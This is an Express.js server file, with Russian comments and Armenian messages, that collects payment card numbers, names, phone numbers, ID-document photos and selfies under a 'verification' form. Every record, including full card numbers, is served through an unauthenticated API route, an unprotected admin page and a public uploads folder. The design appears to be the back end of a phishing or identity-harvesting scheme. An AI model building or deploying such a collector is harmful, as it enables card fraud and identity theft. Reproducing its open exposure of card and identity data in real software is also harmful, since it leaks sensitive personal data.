const express = require('express');
const multer = require('multer');
const path = require('path');
const { Pool } = require('pg');
require('dotenv').config();

const app = express();

// Подключение к PostgreSQL на Render
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Multer — для загрузки и сохранения фото
const storage = multer.diskStorage({
  destination: './client/uploads/',
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage });

// Создаём папку uploads, если её нет
const fs = require('fs');
if (!fs.existsSync('./client/uploads')) {
  fs.mkdirSync('./client/uploads', { recursive: true });
}

// Создаём таблицу при старте (если ещё нет)
pool.query(`
  CREATE TABLE IF NOT EXISTS verifications (
    id SERIAL PRIMARY KEY,
    card VARCHAR(19) NOT NULL,
    name TEXT NOT NULL,
    surname TEXT NOT NULL,
    phone VARCHAR(20) NOT NULL,
    doc_path TEXT NOT NULL,
    selfie_path TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT NOW()
  )
`).catch(err => console.error('Ошибка создания таблицы', err));

// Раздаём статические файлы (твой фронтенд)
app.use(express.static(path.join(__dirname, 'client')));
app.use('/uploads', express.static(path.join(__dirname, 'client', 'uploads')));

// Главная маршрут — отдаём index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'client', 'index.html'));
});

// Приём формы + фото
// Приём формы + фото (создаём папку по ID!)
app.post('/submit', upload.fields([
  { name: 'docFile', maxCount: 1 },
  { name: 'selfieFile', maxCount: 1 }
]), async (req, res) => {
  try {
    const { card, name, surname, phone } = req.body;

    // Сначала вставляем в базу (чтобы получить ID)
    const result = await pool.query(
      `INSERT INTO verifications (card, name, surname, phone, doc_path, selfie_path)
       VALUES ($1, $2, $3, $4, $5, $6)
       RETURNING id`,
      [card, name, surname, phone, 'temp.jpg', 'temp.jpg'] // временные имена
    );

    const verificationId = result.rows[0].id;
    const folderPath = path.join(__dirname, 'client', 'uploads', String(verificationId));
    
    // Создаём папку по ID
    if (!fs.existsSync(folderPath)) {
      fs.mkdirSync(folderPath, { recursive: true });
    }

    // Сохраняем фото с понятными именами
    const docFile = req.files['docFile'][0];
    const selfieFile = req.files['selfieFile'][0];

    const docExt = path.extname(docFile.originalname);
    const selfieExt = path.extname(selfieFile.originalname);

    const docPath = path.join(folderPath, `document${docExt}`);
    const selfiePath = path.join(folderPath, `selfie${selfieExt}`);

    fs.renameSync(docFile.path, docPath);
    fs.renameSync(selfieFile.path, selfiePath);

    // Обновляем пути в базе
    const relativeDocPath = `uploads/${verificationId}/document${docExt}`;
    const relativeSelfiePath = `uploads/${verificationId}/selfie${selfieExt}`;

    await pool.query(
      `UPDATE verifications SET doc_path = $1, selfie_path = $2 WHERE id = $3`,
      [relativeDocPath, relativeSelfiePath, verificationId]
    );

    res.json({ success: true, message: 'Հաջողությամբ ուղարկվեց!' });
  } catch (err) {
    console.error('Ошибка при сохранении:', err);
    res.status(500).json({ success: false, message: 'Սերվերի սխալ' });
  }
});

// === API: получить все верификации ===
app.get('/api/verifications', async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT id, name, surname, phone, card, doc_path, selfie_path, created_at 
      FROM verifications 
      ORDER BY id DESC
    `);
    res.json(result.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json([]);
  }
});

// === АДМИНКА ===
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'client', 'admin.html'));
});



const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});